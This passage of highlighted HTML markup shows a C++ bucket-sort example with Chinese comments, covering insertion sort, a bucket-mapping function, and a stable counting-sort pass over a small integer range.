data-line=\"crayon-5b4aa930959d7768642092-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-52\">52</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-53\">53</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-54\">54</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-55\">55</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-56\">56</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-57\">57</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-58\">58</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-59\">59</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-60\">60</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-61\">61</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-62\">62</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-63\">63</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-64\">64</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-65\">65</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-66\">66</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-67\">67</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-68\">68</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-69\">69</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-70\">70</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-71\">71</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-72\">72</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-73\">73</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-74\">74</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-75\">75</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-76\">76</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-77\">77</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-78\">78</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-79\">79</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-80\">80</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-81\">81</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-82\">82</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-83\">83</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-84\">84</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-85\">85</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-86\">86</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959d7768642092-87\">87</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959d7768642092-88\">88</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-1\"><span class=\"crayon-p\">#include&lt;iostream&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-2\"><span class=\"crayon-e\">using </span><span class=\"crayon-t\">namespace</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">std</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-4\"><span class=\"crayon-c\">// 分类 ------------- 内部非比较排序</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-5\"><span class=\"crayon-c\">// 数据结构 --------- 数组</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-6\"><span class=\"crayon-c\">// 最差时间复杂度 ---- O(nlogn)或O(n^2)，只有一个桶，取决于桶内排序方式</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-7\"><span class=\"crayon-c\">// 最优时间复杂度 ---- O(n)，每个元素占一个桶</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-8\"><span class=\"crayon-c\">// 平均时间复杂度 ---- O(n)，保证各个桶内元素个数均匀即可</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-9\"><span class=\"crayon-c\">// 所需辅助空间 ------ O(n + bn)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-10\"><span class=\"crayon-c\">// 稳定性 ----------- 稳定</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-12\"><span class=\"crayon-c\">/* 本程序用数组模拟桶 */</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-13\"><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bn</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 这里排序[0,49]的元素，使用5个桶就够了，也可以根据输入动态确定桶的数量</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-14\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">C</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">bn</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">           </span><span class=\"crayon-c\">// 计数数组，存放桶的边界信息</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-15\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-16\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">InsertionSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">left</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-17\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-18\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">left</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">right</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">  </span><span class=\"crayon-c\">// 从第二张牌开始抓，直到最后一张牌</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-19\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-20\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">get</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-21\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-22\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">left</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">get</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-23\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-24\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-25\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">j</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-26\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-27\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">get</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-28\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-29\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-30\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-31\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">MapToBucket</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-32\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-33\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 映射函数f(x)，作用相当于快排中的Partition，把大量数据分割成基本有序的数据块</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-34\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-35\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-36\"><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">CountingSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-37\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-38\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bn</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-39\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-40\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">C</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-41\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-42\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">     </span><span class=\"crayon-c\">// 使C[i]保存着i号桶中元素的个数</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-43\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-44\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">C</span><span class=\"crayon-sy\">[</span><span class=\"crayon-e\">MapToBucket</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-45\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-46\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bn</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 定位桶边界：初始时，C[i]-1为i号桶最后一个元素的位置</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-47\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-48\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">C</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">C</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">C</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-49\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-50\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">B</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-e\">malloc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-51\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">)</span><span class=\"crayon-c\">// 从后向前扫描保证计数排序的稳定性(重复元素相对次序不变)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-52\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-53\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">b</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">MapToBucket</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span><span class=\"crayon-c\">// 元素A[i]位于b号桶</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-54\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">B</span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">C</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">b</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">           </span><span class=\"crayon-c\">// 把每个元素A[i]放到它在输出数组B中的正确位置上</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-55\"><span class=\"crayon-h\">                                    </span><span class=\"crayon-c\">// 桶的边界被更新：C[b]为b号桶第一个元素的位置</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-56\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-57\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-58\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959d7768642092-59\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">B</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959d7768642092-60\"><span class=\"crayon-h\">    </span><span 